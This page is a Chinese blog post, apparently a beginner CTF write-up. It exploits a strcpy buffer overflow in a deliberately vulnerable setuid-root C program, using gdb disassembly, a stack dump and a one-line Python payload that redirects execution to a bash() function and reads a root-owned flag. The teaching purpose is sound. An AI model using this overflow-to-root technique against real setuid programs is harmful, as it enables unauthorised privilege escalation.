<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>一次简单的pwn题目 « 倾旋的博客</title>
  <meta name="description" content="一次简单的pwn题目">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2018-11-06/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">一次简单的pwn题目</h1>
    <p class="post-meta">Nov 6, 2018</p>
  </header>

  <article class="post-content">
    <p>一次简单的pwn题目
<!--more--></p>

<h2 id="0x01-背景介绍">0x01 背景介绍</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-06/89878547F623C64F0C41D9A5E04DD0E1.jpg" alt="0x01"></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-06/A0240C8DD946466BBD6385370A450BE1.jpg" alt="0x02"></p>

<p>在A师傅的带领下，我假想了一个pwn简单题目，非常适合新手中的新手，其实发出来有点丢人的。</p>

<p>题目背景是这样的：</p>

<p>小Q登录上了一个服务器，他的用户名是<code class="language-plaintext highlighter-rouge">rvn0xsy</code>，没有root权限，在home目录里发现了一个名为flag.txt的文件，很明显要获得flag.txt的内容，但是事情并没有那么简单……</p>

<p>小Q踏上了艰辛的旅程。</p>

<h2 id="0x02-初入江湖">0x02 初入江湖</h2>

<p>小Q查看了一下目录文件：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span>ll
total 44
drwxrwxr-x  2 rvn0xsy rvn0xsy 4096 Nov  5 19:50 ./
drwxr-xr-x 20 rvn0xsy rvn0xsy 4096 Nov  5 09:47 ../
<span class="nt">-rwsr-sr-x</span>  1 root    root    8487 Nov  5 09:48 a.out<span class="k">*</span>
<span class="nt">-rw-------</span>  1 root    rvn0xsy    6 Nov  5 19:50 flag.txt
<span class="nt">-rw-rw-r--</span>  1 rvn0xsy rvn0xsy  317 Nov  5 09:48 pwn.c
rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span><span class="nb">cat </span>flag.txt 
<span class="nb">cat</span>: flag.txt: Permission denied
rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span>
</code></pre></div></div>
<p>发现了flag.txt，没有权限读取 :(</p>

<p>只能把目光转向<code class="language-plaintext highlighter-rouge">a.out</code>，这个文件似乎不是那么简单，它具有S属性，如果我们能够通过它来执行命令的话……那肯定可以读取flag.txt ！！</p>

<p>旁边还有一个pwn.c，会不会是它的源码呢？</p>

<h2 id="0x03-踏上征程">0x03 踏上征程</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span><span class="nb">cat</span> <span class="nt">-n</span> pwn.c 
     1	<span class="c">#include &lt;stdio.h&gt;</span>
     2	<span class="c">#include &lt;unistd.h&gt;</span>
     3	<span class="c">#include &lt;string.h&gt;</span>
     4	<span class="c">#include &lt;stdlib.h&gt;</span>
     5	
     6	int bash<span class="o">()</span><span class="p">;</span>
     7	
     8	int main<span class="o">(</span>int argc,char <span class="k">*</span> argv[]<span class="o">){</span>
     9		setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
    10		<span class="k">if</span><span class="o">(</span>argv[1] <span class="o">==</span> NULL<span class="o">){</span>
    11			<span class="nb">printf</span><span class="o">(</span><span class="s2">"usage : %s input string </span><span class="se">\n</span><span class="s2">"</span>,argv[0]<span class="o">)</span><span class="p">;</span>
    12			<span class="nb">exit</span><span class="o">(</span><span class="nt">-1</span><span class="o">)</span><span class="p">;</span>
    13		<span class="o">}</span>
    14		char a[20]<span class="p">;</span>
    15		strcpy<span class="o">(</span>a,argv[1]<span class="o">)</span><span class="p">;</span>
    16		<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s </span><span class="se">\n</span><span class="s2">"</span>,a<span class="o">)</span><span class="p">;</span>
    17	<span class="o">}</span>
    18	
    19	int bash<span class="o">(){</span>
    20	  system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="p">;</span>
    21	<span class="o">}</span>
rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span>
</code></pre></div></div>

<p>可以看到<code class="language-plaintext highlighter-rouge">main</code>函数中有一个<code class="language-plaintext highlighter-rouge">setuid(0);</code>，它将具有S属性的程序设置为root权限运行，其次该文件中还有一个<code class="language-plaintext highlighter-rouge">bash</code>函数，灵光乍现！ 如果执行了<code class="language-plaintext highlighter-rouge">setuid(0);</code>再调用<code class="language-plaintext highlighter-rouge">bash</code>函数就可以获得一个root权限的bash shell。</p>

<p>但是main函数中并没有调用bash函数，这个怎么办呢？</p>

<p>焦虑的小Q又会想起当年学习C语言时，自己触发过N次的<code class="language-plaintext highlighter-rouge">segment fault</code>，是由于它没有检查<code class="language-plaintext highlighter-rouge">strcpy</code>参数传入的长度，导致覆盖了数组边界。</p>

<p>但是其背后引出的问题都不是那么简单，上面只是普通程序员所理解的程度，而要深入问题的本质，还是要看汇编代码：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> disassemble main 
Dump of assembler code <span class="k">for function </span>main:
   0x080484dd &lt;+0&gt;:	push   ebp <span class="p">;</span>将栈基地址压入栈
   0x080484de &lt;+1&gt;:	mov    ebp,esp <span class="p">;</span>设置当前栈指针地址为基址
   0x080484e0 &lt;+3&gt;:	and    esp,0xfffffff0
   0x080484e3 &lt;+6&gt;:	sub    esp,0x30 <span class="p">;</span>将esp向后增长30（16进制<span class="o">=&gt;</span>48字节）位 给char a[20]分配的也在其中
   0x080484e6 &lt;+9&gt;:	mov    DWORD PTR <span class="o">[</span>esp],0x0
   0x080484ed &lt;+16&gt;:	call   0x80483d0 &lt;setuid@plt&gt; <span class="p">;</span> 调用setuid<span class="o">(</span>0<span class="o">)</span>
   0x080484f2 &lt;+21&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x080484f5 &lt;+24&gt;:	add    eax,0x4
   0x080484f8 &lt;+27&gt;:	mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x080484fa &lt;+29&gt;:	<span class="nb">test   </span>eax,eax
   0x080484fc &lt;+31&gt;:	jne    0x804851f &lt;main+66&gt; <span class="p">;</span> 判断argv[1]是否为空
   0x080484fe &lt;+33&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x08048501 &lt;+36&gt;:	mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x08048503 &lt;+38&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x08048507 &lt;+42&gt;:	mov    DWORD PTR <span class="o">[</span>esp],0x8048600
   0x0804850e &lt;+49&gt;:	call   0x8048370 &lt;<span class="nb">printf</span>@plt&gt; <span class="p">;</span> 调用printf
   0x08048513 &lt;+54&gt;:	mov    DWORD PTR <span class="o">[</span>esp],0xffffffff
   0x0804851a &lt;+61&gt;:	call   0x80483b0 &lt;<span class="nb">exit</span>@plt&gt; <span class="p">;</span> 退出
   0x0804851f &lt;+66&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc]
   0x08048522 &lt;+69&gt;:	add    eax,0x4
   0x08048525 &lt;+72&gt;:	mov    eax,DWORD PTR <span class="o">[</span>eax]
   0x08048527 &lt;+74&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x0804852b &lt;+78&gt;:	lea    eax,[esp+0x1c]
   0x0804852f &lt;+82&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
   0x08048532 &lt;+85&gt;:	call   0x8048380 &lt;strcpy@plt&gt;
   0x08048537 &lt;+90&gt;:	lea    eax,[esp+0x1c]
   0x0804853b &lt;+94&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4],eax
   0x0804853f &lt;+98&gt;:	mov    DWORD PTR <span class="o">[</span>esp],0x804861a
   0x08048546 &lt;+105&gt;:	call   0x8048370 &lt;<span class="nb">printf</span>@plt&gt; <span class="p">;</span> 输出 a
   0x0804854b &lt;+110&gt;:	leave  
   0x0804854c &lt;+111&gt;:	ret    
End of assembler dump.
</code></pre></div></div>

<p>在<code class="language-plaintext highlighter-rouge">strcpy</code>处设置断点，栈情况：</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xbfe74180 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
0004| 0xbfe74184 <span class="nt">--</span><span class="o">&gt;</span> 0x2f <span class="o">(</span><span class="s1">'/'</span><span class="o">)</span>
0008| 0xbfe74188 <span class="nt">--</span><span class="o">&gt;</span> 0x804a000 <span class="nt">--</span><span class="o">&gt;</span> 0x8049f14 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
0012| 0xbfe7418c <span class="nt">--</span><span class="o">&gt;</span> 0x80485c2 <span class="o">(</span>&lt;__libc_csu_init+82&gt;:	add    edi,0x1<span class="o">)</span>
0016| 0xbfe74190 <span class="nt">--</span><span class="o">&gt;</span> 0x2 
0020| 0xbfe74194 <span class="nt">--</span><span class="o">&gt;</span> 0xbfe74254 <span class="nt">--</span><span class="o">&gt;</span> 0xbfe75921 <span class="o">(</span><span class="s2">"/home/rvn0xsy/Pwn/a.out"</span><span class="o">)</span>
0024| 0xbfe74198 <span class="nt">--</span><span class="o">&gt;</span> 0xbfe74260 <span class="nt">--</span><span class="o">&gt;</span> 0xbfe7593d <span class="o">(</span><span class="s2">"SHELL=/bin/bash"</span><span class="o">)</span>
0028| 0xbfe7419c <span class="nt">--</span><span class="o">&gt;</span> 0xb755164d <span class="o">(</span>&lt;__cxa_atexit+29&gt;:	<span class="nb">test   </span>eax,eax<span class="o">)</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">0xbfe75921</code>就是<code class="language-plaintext highlighter-rouge">argv</code>数组的首地址</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> x /8s 0xbfe75921
0xbfe75921:	<span class="s2">"/home/rvn0xsy/Pwn/a.out"</span>
0xbfe75939:	<span class="s2">"123"</span>
0xbfe7593d:	<span class="s2">"SHELL=/bin/bash"</span>
0xbfe7594d:	<span class="s2">"TERM=xterm"</span>
0xbfe75958:	<span class="s2">"USER=rvn0xsy"</span>
0xbfe75962:	<span class="s2">"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"</span>...
0xbfe75a2a:	<span class="s2">":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"</span>...
0xbfe75af2:	<span class="s2">"eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"</span>...
<span class="o">&gt;&gt;&gt;</span> 
</code></pre></div></div>

<p>可以看到，我们传入的<code class="language-plaintext highlighter-rouge">123</code>在<code class="language-plaintext highlighter-rouge">0xbfe75939</code></p>

<p>通过计算<code class="language-plaintext highlighter-rouge">strcpy()</code>的栈偏移量，我们可以确定<code class="language-plaintext highlighter-rouge">0xbfe75939</code>到<code class="language-plaintext highlighter-rouge">ESP</code>中函数返回值的空间有<code class="language-plaintext highlighter-rouge">0xc</code>这个长度。</p>

<p>由于还有内存对齐的缘故，所以缓冲区的大小应该是32，再向后4个字节就是strcpy的下一条指令的地址</p>

<h2 id="0x04-小有成绩">0x04 小有成绩</h2>

<p>获得bash函数的地址：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> p bash
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>int <span class="o">()}</span> 0x804854d &lt;bash&gt;
<span class="o">&gt;&gt;&gt;</span> 
</code></pre></div></div>

<p>构造shellcode：</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s2">"print 'x'*32+'</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08'"</span><span class="o">&gt;</span> exploit.txt
</code></pre></div></div>

<h2 id="0x05-修仙完毕">0x05 修仙完毕</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span>./a.out <span class="si">$(</span><span class="nb">cat </span>exploit.txt<span class="si">)</span>
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxM� 
bash-4.3# <span class="nb">cat </span>flag.txt 
12580
bash-4.3# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rvn0xsy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lpadmin<span class="o">)</span>,125<span class="o">(</span>sambashare<span class="o">)</span>,1000<span class="o">(</span>rvn0xsy<span class="o">)</span>
bash-4.3# <span class="nb">exit
exit
</span>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
rvn0xsy@ubuntu:~/Pwn<span class="nv">$ </span>
</code></pre></div></div>
<p>flag.txt内容是12580，退出的时候，是由于EIP寄存器指向了一个非指令内存区域，导致段地址错误。</p>


  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
